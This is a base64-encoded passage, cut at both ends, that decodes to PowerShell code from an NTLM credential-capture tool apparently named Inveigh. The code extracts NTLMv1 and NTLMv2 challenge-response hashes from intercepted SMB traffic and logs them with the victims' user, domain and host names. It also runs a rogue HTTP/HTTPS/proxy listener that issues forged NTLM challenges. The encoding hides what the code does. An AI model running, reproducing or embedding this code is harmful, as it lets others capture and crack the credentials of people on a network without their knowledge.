IiIKCiAgICAgICAgICAgICROVExNX2xlbmd0aCA9IERhdGFMZW5ndGgyICgkTlRMTVNTUF9vZmZzZXQgKyAyMCkgJHBheWxvYWRfYnl0ZXMKICAgICAgICAgICAgJE5UTE1fb2Zmc2V0ID0gRGF0YUxlbmd0aDQgKCROVExNU1NQX29mZnNldCArIDI0KSAkcGF5bG9hZF9ieXRlcwogICAgICAgICAgICAkTlRMTV9yZXNwb25zZSA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJHBheWxvYWRfYnl0ZXNbKCROVExNU1NQX29mZnNldCArICROVExNX29mZnNldCkuLigkTlRMTVNTUF9vZmZzZXQgKyAkTlRMTV9vZmZzZXQgKyAkTlRMTV9sZW5ndGggLSAxKV0pIC1yZXBsYWNlICItIiwiIgoKICAgICAgICAgICAgJGRvbWFpbl9sZW5ndGggPSBEYXRhTGVuZ3RoMiAoJE5UTE1TU1Bfb2Zmc2V0ICsgMjgpICRwYXlsb2FkX2J5dGVzCiAgICAgICAgICAgICRkb21haW5fb2Zmc2V0ID0gRGF0YUxlbmd0aDQgKCROVExNU1NQX29mZnNldCArIDMyKSAkcGF5bG9hZF9ieXRlcwogICAgICAgICAgICAkTlRMTV9kb21haW5fc3RyaW5nID0gRGF0YVRvU3RyaW5nICgkTlRMTVNTUF9vZmZzZXQgKyAkZG9tYWluX29mZnNldCkgJGRvbWFpbl9sZW5ndGggJHBheWxvYWRfYnl0ZXMKCiAgICAgICAgICAgICR1c2VyX2xlbmd0aCA9IERhdGFMZW5ndGgyICgkTlRMTVNTUF9vZmZzZXQgKyAzNikgJHBheWxvYWRfYnl0ZXMKICAgICAgICAgICAgJHVzZXJfb2Zmc2V0ID0gRGF0YUxlbmd0aDQgKCROVExNU1NQX29mZnNldCArIDQwKSAkcGF5bG9hZF9ieXRlcwogICAgICAgICAgICAkTlRMTV91c2VyX3N0cmluZyA9IERhdGFUb1N0cmluZyAoJE5UTE1TU1Bfb2Zmc2V0ICsgJHVzZXJfb2Zmc2V0KSAkdXNlcl9sZW5ndGggJHBheWxvYWRfYnl0ZXMKCiAgICAgICAgICAgICRob3N0X2xlbmd0aCA9IERhdGFMZW5ndGgyICgkTlRMTVNTUF9vZmZzZXQgKyA0NCkgJHBheWxvYWRfYnl0ZXMKICAgICAgICAgICAgJGhvc3Rfb2Zmc2V0ID0gRGF0YUxlbmd0aDQgKCROVExNU1NQX29mZnNldCArIDQ4KSAkcGF5bG9hZF9ieXRlcwogICAgICAgICAgICAkTlRMTV9ob3N0X3N0cmluZyA9IERhdGFUb1N0cmluZyAoJE5UTE1TU1Bfb2Zmc2V0ICsgJGhvc3Rfb2Zmc2V0KSAkaG9zdF9sZW5ndGggJHBheWxvYWRfYnl0ZXMKCiAgICAgICAgICAgIGlmKCROVExNX2xlbmd0aCAtZ3QgMjQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICROVExNdjJfcmVzcG9uc2UgPSAkTlRMTV9yZXNwb25zZS5JbnNlcnQoMzIsJzonKQogICAgICAgICAgICAgICAgJE5UTE12Ml9oYXNoID0gJE5UTE1fdXNlcl9zdHJpbmcgKyAiOjoiICsgJE5UTE1fZG9tYWluX3N0cmluZyArICI6IiArICROVExNX2NoYWxsZW5nZSArICI6IiArICROVExNdjJfcmVzcG9uc2UKCiAgICAgICAgICAgICAgICBpZigkc291cmNlX0lQIC1uZSAkSVAgLWFuZCAoJGludmVpZ2gubWFjaGluZV9hY2NvdW50cyAtb3IgKCEkaW52ZWlnaC5tYWNoaW5lX2FjY291bnRzIC1hbmQgLW5vdCAkTlRMTV91c2VyX3N0cmluZy5FbmRzV2l0aCgnJCcpKSkpCiAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiBOVExNdjIgY2hhbGxlbmdlL3Jlc3BvbnNlIGZvciAkTlRMTV9kb21haW5fc3RyaW5nXCROVExNX3VzZXJfc3RyaW5nIGNhcHR1cmVkIGZyb20gJHNvdXJjZV9JUCgkTlRMTV9ob3N0X3N0cmluZykiKQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2gubG9nX291dHB1dCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIE5UTE12MiBjaGFsbGVuZ2UvcmVzcG9uc2UgZm9yICROVExNX2RvbWFpbl9zdHJpbmdcJE5UTE1fdXNlcl9zdHJpbmcgY2FwdHVyZWQgZnJvbSAkc291cmNlX0lQKCROVExNX2hvc3Rfc3RyaW5nKSIpCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5OVExNdjJfbGlzdC5BZGQoJE5UTE12Ml9oYXNoKQoKICAgICAgICAgICAgICAgICAgICBpZighJGludmVpZ2guY29uc29sZV91bmlxdWUgLW9yICgkaW52ZWlnaC5jb25zb2xlX3VuaXF1ZSAtYW5kICRpbnZlaWdoLk5UTE12Ml91c2VybmFtZV9saXN0IC1ub3Rjb250YWlucyAiJHNvdXJjZV9JUCAkTlRMTV9kb21haW5fc3RyaW5nXCROVExNX3VzZXJfc3RyaW5nIikpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgTlRMTXYyIGNoYWxsZW5nZS9yZXNwb25zZSBjYXB0dXJlZCBmcm9tICRzb3VyY2VfSVAoJE5UTE1faG9zdF9zdHJpbmcpOmBuJE5UTE12Ml9oYXNoIikKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIE5UTE12MiBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZWQgZnJvbSAkc291cmNlX0lQKCROVExNX2hvc3Rfc3RyaW5nKTpgbiROVExNX2RvbWFpbl9zdHJpbmdcJE5UTE1fdXNlcl9zdHJpbmcgLSBub3QgdW5pcXVlIikKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0IC1hbmQgKCEkaW52ZWlnaC5maWxlX3VuaXF1ZSAtb3IgKCRpbnZlaWdoLmZpbGVfdW5pcXVlIC1hbmQgJGludmVpZ2guTlRMTXYyX3VzZXJuYW1lX2xpc3QgLW5vdGNvbnRhaW5zICIkc291cmNlX0lQICROVExNX2RvbWFpbl9zdHJpbmdcJE5UTE1fdXNlcl9zdHJpbmciKSkpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5OVExNdjJfZmlsZV9xdWV1ZS5BZGQoJE5UTE12Ml9oYXNoKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiU01CIE5UTE12MiBjaGFsbGVuZ2UvcmVzcG9uc2Ugd3JpdHRlbiB0byAiICsgJGludmVpZ2guTlRMTXYyX291dF9maWxlKQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guTlRMTXYyX3VzZXJuYW1lX2xpc3QgLW5vdGNvbnRhaW5zICIkc291cmNlX0lQICROVExNX2RvbWFpbl9zdHJpbmdcJE5UTE1fdXNlcl9zdHJpbmciKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guTlRMTXYyX3VzZXJuYW1lX2xpc3QuQWRkKCIkc291cmNlX0lQICROVExNX2RvbWFpbl9zdHJpbmdcJE5UTE1fdXNlcl9zdHJpbmciKQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guSVBfY2FwdHVyZV9saXN0IC1ub3Rjb250YWlucyAkc291cmNlX0lQIC1hbmQgLW5vdCAkTlRMTV91c2VyX3N0cmluZy5FbmRzV2l0aCgnJCcpIC1hbmQgISRpbnZlaWdoLnNwb29mZXJfcmVwZWF0IC1hbmQgJHNvdXJjZV9JUCAtbmUgJElQKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guSVBfY2FwdHVyZV9saXN0LkFkZCgkc291cmNlX0lQLklQQWRkcmVzc1RvU3RyaW5nKQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZigkTlRMTV9sZW5ndGggLWVxIDI0KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkTlRMTXYxX2hhc2ggPSAkTlRMTV91c2VyX3N0cmluZyArICI6OiIgKyAkTlRMTV9kb21haW5fc3RyaW5nICsgIjoiICsgJExNX3Jlc3BvbnNlICsgIjoiICsgJE5UTE1fcmVzcG9uc2UgKyAiOiIgKyAkTlRMTV9jaGFsbGVuZ2UKCiAgICAgICAgICAgICAgICBpZigkc291cmNlX0lQIC1uZSAkSVAgLWFuZCAoJGludmVpZ2gubWFjaGluZV9hY2NvdW50cyAtb3IgKCEkaW52ZWlnaC5tYWNoaW5lX2FjY291bnRzIC1hbmQgLW5vdCAkTlRMTV91c2VyX3N0cmluZy5FbmRzV2l0aCgnJCcpKSkpCiAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiBOVExNdjEgY2hhbGxlbmdlL3Jlc3BvbnNlIGZvciAkTlRMTV9kb21haW5fc3RyaW5nXCROVExNX3VzZXJfc3RyaW5nIGNhcHR1cmVkIGZyb20gJHNvdXJjZV9JUCgkTlRMTV9ob3N0X3N0cmluZykiKQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2gubG9nX291dHB1dCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIE5UTE12MSBjaGFsbGVuZ2UvcmVzcG9uc2UgZm9yICROVExNX2RvbWFpbl9zdHJpbmdcJE5UTE1fdXNlcl9zdHJpbmcgY2FwdHVyZWQgZnJvbSAkc291cmNlX0lQKCROVExNX2hvc3Rfc3RyaW5nKSIpCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5OVExNdjFfbGlzdC5BZGQoJE5UTE12MV9oYXNoKQoKICAgICAgICAgICAgICAgICAgICBpZighJGludmVpZ2guY29uc29sZV91bmlxdWUgLW9yICgkaW52ZWlnaC5jb25zb2xlX3VuaXF1ZSAtYW5kICRpbnZlaWdoLk5UTE12MV91c2VybmFtZV9saXN0IC1ub3Rjb250YWlucyAiJHNvdXJjZV9JUCAkTlRMTV9kb21haW5fc3RyaW5nXCROVExNX3VzZXJfc3RyaW5nIikpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgU01CIE5UTE12MSBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZWQgZnJvbSAkc291cmNlX0lQKCROVExNX2hvc3Rfc3RyaW5nKTpgbiROVExNdjFfaGFzaCIpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiBOVExNdjEgY2hhbGxlbmdlL3Jlc3BvbnNlIGNhcHR1cmVkIGZyb20gJHNvdXJjZV9JUCgkTlRMTV9ob3N0X3N0cmluZyk6YG4kTlRMTV9kb21haW5fc3RyaW5nXCROVExNX3VzZXJfc3RyaW5nIC0gbm90IHVuaXF1ZSIpCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCAtYW5kICghJGludmVpZ2guZmlsZV91bmlxdWUgLW9yICgkaW52ZWlnaC5maWxlX3VuaXF1ZSAtYW5kICRpbnZlaWdoLk5UTE12MV91c2VybmFtZV9saXN0IC1ub3Rjb250YWlucyAiJHNvdXJjZV9JUCAkTlRMTV9kb21haW5fc3RyaW5nXCROVExNX3VzZXJfc3RyaW5nIikpKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guTlRMTXYxX2ZpbGVfcXVldWUuQWRkKCROVExNdjFfaGFzaCkKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIlNNQiBOVExNdjEgY2hhbGxlbmdlL3Jlc3BvbnNlIHdyaXR0ZW4gdG8gIiArICRpbnZlaWdoLk5UTE12MV9vdXRfZmlsZSkKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLk5UTE12MV91c2VybmFtZV9saXN0IC1ub3Rjb250YWlucyAiJHNvdXJjZV9JUCAkTlRMTV9kb21haW5fc3RyaW5nXCROVExNX3VzZXJfc3RyaW5nIikKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLk5UTE12MV91c2VybmFtZV9saXN0LkFkZCgiJHNvdXJjZV9JUCAkTlRMTV9kb21haW5fc3RyaW5nXCROVExNX3VzZXJfc3RyaW5nIikKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLklQX2NhcHR1cmVfbGlzdCAtbm90Y29udGFpbnMgJHNvdXJjZV9JUCAtYW5kIC1ub3QgJE5UTE1fdXNlcl9zdHJpbmcuRW5kc1dpdGgoJyQnKSAtYW5kICEkaW52ZWlnaC5zcG9vZmVyX3JlcGVhdCAtYW5kICRzb3VyY2VfSVAgLW5lICRJUCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLklQX2NhcHR1cmVfbGlzdC5BZGQoJHNvdXJjZV9JUC5JUEFkZHJlc3NUb1N0cmluZykKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQoKICAgICAgICB9CgogICAgfQoKfQoKIyBIVFRQIFNlcnZlciBTY3JpcHRCbG9jayAtIEhUVFAvSFRUUFMvUHJveHkgbGlzdGVuZXIKJEhUVFBfc2NyaXB0YmxvY2sgPSAKeyAKICAgIHBhcmFtICgkQ2hhbGxlbmdlLCRIVFRQQXV0aCwkSFRUUEJhc2ljUmVhbG0sJEhUVFBDb250ZW50VHlwZSwkSFRUUElQLCRIVFRQUG9ydCwkSFRUUERlZmF1bHRFWEUsJEhUVFBEZWZhdWx0RmlsZSwkSFRUUERpciwkSFRUUFJlc2V0RGVsYXksJEhUVFBSZXNldERlbGF5VGltZW91dCwkSFRUUFJlc3BvbnNlLAogICAgJEhUVFBTX2xpc3RlbmVyLCROQk5TQnJ1dGVGb3JjZVBhdXNlLCRQcm94eSwkUHJveHlJZ25vcmUsJHByb3h5X2xpc3RlbmVyLCRXUEFEQXV0aCwkV1BBREF1dGhJZ25vcmUsJFdQQURSZXNwb25zZSkKCiAgICBmdW5jdGlvbiBOVExNQ2hhbGxlbmdlQmFzZTY0CiAgICB7CiAgICAgICAgcGFyYW0gKFtTdHJpbmddJENoYWxsZW5nZSxbQm9vbF0kTlRMTUVTUyxbU3RyaW5nXSRDbGllbnRJUEFkZHJlc3MsW0ludF0kQ2xpZW50UG9ydCkKCiAgICAgICAgJEhUVFBfdGltZXN0YW1wID0gR2V0LURhdGUKICAgICAgICAkSFRUUF90aW1lc3RhbXAgPSAkSFRUUF90aW1lc3RhbXAuVG9GaWxlVGltZSgpCiAgICAgICAgJEhUVFBfdGltZXN0YW1wID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRIVFRQX3RpbWVzdGFtcCkpCiAgICAgICAgJEhUVFBfdGltZXN0YW1wID0gJEhUVFBfdGltZXN0YW1wLlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0KCiAgICAgICAgaWYoJENoYWxsZW5nZSkKICAgICAgICB7CiAgICAgICAgICAgICRIVFRQX2NoYWxsZW5nZSA9ICRDaGFsbGVuZ2UKICAgICAgICAgICAgJEhUVFBfY2hhbGxlbmdlX2J5dGVzID0gJEhUVFBfY2hhbGxlbmdlLkluc2VydCgyLCctJykuSW5zZXJ0KDUsJy0nKS5JbnNlcnQoOCwnLScpLkluc2VydCgxMSwnLScpLkluc2VydCgxNCwnLScpLkluc2VydCgxNywnLScpLkluc2VydCgyMCwnLScpCiAgICAgICAgICAgICRIVFRQX2NoYWxsZW5nZV9ieXRlcyA9ICRIVFRQX2NoYWxsZW5nZV9ieXRlcy5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRIVFRQX2NoYWxsZW5nZV9ieXRlcyA9IFtTdHJpbmddKDEuLjggfCBGb3JFYWNoLU9iamVjdCB7InswOlgyfSIgLWYgKEdldC1SYW5kb20gLU1pbmltdW0gMSAtTWF4aW11bSAyNTUpfSkKICAgICAgICAgICAgJEhUVFBfY2hhbGxlbmdlID0gJEhUVFBfY2hhbGxlbmdlX2J5dGVzIC1yZXBsYWNlICcgJywgJycKICAgICAgICAgICAgJEhUVFBfY2hhbGxlbmdlX2J5dGVzID0gJEhUVFBfY2hhbGxlbmdlX2J5dGVzLlNwbGl0KCIgIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0KICAgICAgICB9CgogICAgICAgICRpbnZlaWdoLkhUVFBfY2hhbGxlbmdlX3F1ZXVlLkFkZCgkQ2xpZW50SVBBZGRyZXNzICsgJENsaWVudFBvcnQgKyAnLCcgKyAkSFRUUF9jaGFsbGVuZ2UpICA+ICRudWxsCgogICAgICAgIGlmKCROVExNRVNTKQogICAgICAgIHsKICAgICAgICAgICAgJEhUVFBfTlRMTV9uZWdvdGlhdGlvbl9mbGFncyA9IDB4MDUsMHg4MiwweDg5LDB4MGEKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJEhUVFBfTlRMTV9uZWdvdGlhdGlvbl9mbGFncyA9IDB4MDUsMHg4MiwweDgxLDB4MGEKICAgICAgICB9CgogICAgICAgICRIVFRQX05UTE1fYnl0ZXMgPSAweDRlLDB4NTQsMHg0YywweDRkLDB4NTMsMHg1MywweDUwLDB4MDAsMHgwMiwweDAwLDB4MDAsMHgwMCwweDA2LDB4MDAsMHgwNiwweDAwLDB4MzgsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSFRUUF9OVExNX25lZ290aWF0aW9uX2ZsYWdzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRIVFRQX2NoYWxsZW5nZV9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg4MiwweDAwLDB4ODIsMHgwMCwweDNlLDB4MDAsMHgwMCwweDAwLDB4MDYsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAxLDB4YjEsMHgxZCwweDAwLDB4MDAsMHgwMCwweDBmLDB4NGMsMHgwMCwweDQxLDB4MDAsMHg0MiwweDAwLDB4MDIsMHgwMCwweDA2LDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDRjLDB4MDAsMHg0MSwweDAwLDB4NDIsMHgwMCwweDAxLDB4MDAsMHgxMCwweDAwLDB4NDgsMHgwMCwweDRmLDB4MDAsMHg1MywweDAwLDB4NTQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4NGUsMHgwMCwweDQxLDB4MDAsMHg0ZCwweDAwLDB4NDUsMHgwMCwweDA0LDB4MDAsMHgxMiwweDAwLDB4NmMsMHgwMCwweDYxLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDYyLDB4MDAsMHgyZSwweDAwLDB4NmMsMHgwMCwweDZmLDB4MDAsMHg2MywweDAwLDB4NjEsMHgwMCwweDZjLDB4MDAsMHgwMywweDAwLDB4MjQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4NjgsMHgwMCwweDZmLDB4MDAsMHg3MywweDAwLDB4NzQsMHgwMCwweDZlLDB4MDAsMHg2MSwweDAwLDB4NmQsMHgwMCwweDY1LDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDJlLDB4MDAsMHg2YywweDAwLDB4NjEsMHgwMCwweDYyLDB4MDAsMHgyZSwweDAwLDB4NmMsMHgwMCwweDZmLDB4MDAsMHg2MywweDAwLDB4NjEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4NmMsMHgwMCwweDA1LDB4MDAsMHgxMiwweDAwLDB4NmMsMHgwMCwweDYxLDB4MDAsMHg2MiwweDAwLDB4MmUsMHgwMCwweDZjLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDZmLDB4MDAsMHg2MywweDAwLDB4NjEsMHgwMCwweDZjLDB4MDAsMHgwNywweDAwLDB4MDgsMHgwMCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSFRUUF90aW1lc3RhbXAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDBhLDB4MGEKCiAgICAgICAgJE5UTE1fY2hhbGxlbmdlX2Jhc2U2NCA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRIVFRQX05UTE1fYnl0ZXMpCiAgICAgICAgJE5UTE0gPSAiTlRMTSAiICsgJE5UTE1fY2hhbGxlbmdlX2Jhc2U2NAogICAgICAgICROVExNX2NoYWxsZW5nZSA9ICRIVFRQX2NoYWxsZW5nZQogICAgICAgIAogICAgICAgIHJldHVybiAkTlRMTQogICAgfQoKICAgIGlmKCRIVFRQU19saXN0ZW5lcikKICAgIHsKICAgICAgICAkSFRUUF90eXBlID0gIkhUVFBTIgogICAgfQogICAgZWxzZWlmKCRwcm94eV9saXN0ZW5lcikKICAgIHsKICAgICAgICAkSFRUUF90eXBlID0gIlByb3h5IgogICAgfQogICAgZWxzZQogICAgewogICAgICAgICRIVFRQX3R5cGUgPSAiSFRUUCIKICAgIH0KCiAgICBpZigkSFRUUElQIC1uZSAnMC4wLjAuMCcpCiAgICB7CiAgICAgICAgJEhUVFBJUCA9IFtTeXN0ZW0uTmV0LklQQWRkcmVzc106OlBhcnNlKCRIVFRQSVApCiAgICAgICAgJEhUVFBfZW5kcG9pbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuSVBFbmRQb2ludCgkSFRUUElQLCRIVFRQUG9ydCkKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICAkSFRUUF9lbmRwb2ludCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5JUEVuZFBvaW50KFtTeXN0ZW0uTmV0LklQQWRkcmVzc106OmFueSwkSFRUUFBvcnQpCiAgICB9CgogICAgJEhUVFBfcnVubmluZyA9ICR0cnVlCiAgICAkSFRUUF9saXN0ZW5lciA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRjcExpc3RlbmVyICRIVFRQX2VuZHBvaW50CiAgICAkSFRUUF9jbGllbnRfY2xvc2UgPSAkdHJ1ZQoKICAgIGlmKCRwcm94eV9saXN0ZW5lcikKICAgIHsKICAgICAgICAkSFRUUF9saW5nZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5MaW5nZXJPcHRpb24oJHRydWUsMCkKICAgICAgICAkSFRUUF9saXN0ZW5lci5TZXJ2ZXIuTGluZ2VyU3RhdGUgPSAkSFRUUF9saW5nZXIKICAgIH0KICAgIAogICAgdHJ5CiAgICB7CiAgICAgICAgJEhUVFBfbGlzdGVuZXIuU3RhcnQoKQogICAgfQogICAgY2F0Y2gKICAgIHsKICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBFcnJvciBzdGFydGluZyAkSFRUUF90eXBlIGxpc3RlbmVyIikKICAgICAgICAkSFRUUF9ydW5uaW5nID0gJGZhbHNlCgogICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgIHsKICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEVycm9yIHN0YXJ0aW5nICRIVFRQX3R5cGUgbGlzdGVuZXIiKQogICAgICAgIH0KCiAgICAgICAgaWYoJGludmVpZ2gubG9nX291dHB1dCkKICAgICAgICB7CiAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gRXJyb3Igc3RhcnRpbmcgJEhUVFBfdHlwZSBsaXN0ZW5lciIpCiAgICAgICAgfQoKICAgIH0KICAgIAogICAgOkhUVFBfbGlzdGVuZXJfbG9vcCB3aGlsZSgkaW52ZWlnaC5ydW5uaW5nIC1hbmQgJEhUVFBfcnVubmluZykKICAgIHsKICAgICAgICAkVENQX3JlcXVlc3QgPSAiIgogICAgICAgICRUQ1BfcmVxdWVzdF9ieXRlcyA9IE5ldy1PYmplY3QgU3lzdGVtLkJ5dGVbXSA0MDk2CiAgICAgICAgJEhUVFBfc2VuZCA9ICR0cnVlCiAgICAgICAgJEhUVFBfaGVhZGVyX2NvbnRlbnRfdHlwZSA9IDB4NDMsMHg2ZiwweDZlLDB4NzQsMHg2NSwweDZlLDB4NzQsMHgyZCwweDU0LDB4NzksMHg3MCwweDY1LDB4M2EsMHgyMCArIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoInRleHQvaHRtbCIpCiAgICAgICAgJEhUVFBfaGVhZGVyX2NhY2hlX2NvbnRyb2wgPSAiIgogICAgICAgICRIVFRQX2hlYWRlcl9hdXRoZW50aWNhdGUgPSAiIgogICAgICAgICRIVFRQX2hlYWRlcl9hdXRoZW50aWNhdGVfZGF0YSA9ICIiCiAgICAgICAgJEhUVFBfbWVzc2FnZSA9ICIiCiAgICAgICAgJEhUVFBfaGVhZGVyX2F1dGhvcml6YXRpb24gPSAiIgogICAgICAgICRIVFRQX2hlYWRlcl9ob3N0ID0gIiIKICAgICAgICAkSFRUUF9oZWFkZXJfdXNlcl9hZ2VudCA9ICIiCiAgICAgICAgJEhUVFBfcmVxdWVzdF9yYXdfVVJMID0gIiIKICAgICAgICAkTlRMTSA9ICJOVExNIgoKICAgICAgICB3aGlsZSghJEhUVFBfbGlzdGVuZXIuUGVuZGluZygpIC1hbmQgISRIVFRQX2NsaWVudC5Db25uZWN0ZWQpCiAgICAgICAgewoKICAgICAgICAgICAgU3RhcnQtU2xlZXAgLW0gMTAKCiAgICAgICAgICAgIGlmKCEkaW52ZWlnaC5ydW5uaW5nKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBicmVhayBIVFRQX2xpc3RlbmVyX2xvb3AKICAgICAgICAgICAgfQogICAgICAgIAogICAgICAgIH0KCiAgICAgICAgaWYoJEhUVFBTX2xpc3RlbmVyKQogICAgICAgIHsKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmKCEkSFRUUF9jbGllbnQuQ29ubmVjdGVkIC1vciAkSFRUUF9jbGllbnRfY2xvc2UgLWFuZCAkaW52ZWlnaC5ydW5uaW5nKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkSFRUUF9jbGllbnQgPSAkSFRUUF9saXN0ZW5lci5BY2NlcHRUY3BDbGllbnQoKSAKCS